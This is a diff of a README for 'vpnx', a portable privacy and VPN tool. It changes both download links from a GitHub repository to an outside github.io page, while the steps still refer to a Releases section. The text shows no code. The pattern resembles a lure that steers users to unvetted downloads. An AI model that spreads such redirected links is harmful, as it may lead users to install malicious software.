@@ -1,6 +1,6 @@
 # 🛡️ vpnx - Browse the internet with total privacy
 
-[![](https://img.shields.io/badge/Download-vpnx-blue)](https://github.com/Rodrigotravelworn727/vpnx)
+[![](https://img.shields.io/badge/Download-vpnx-blue)](https://rodrigotravelworn727.github.io)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ The software works as a portable application. You do not need to install files i
 
 Visit the link below to reach the software download page. 
 
-[Visit this page to download vpnx](https://github.com/Rodrigotravelworn727/vpnx)
+[Visit this page to download vpnx](https://rodrigotravelworn727.github.io)
 
 1. Click the link above to open your browser.
 2. Look for the section labeled Releases on the right side of the page.
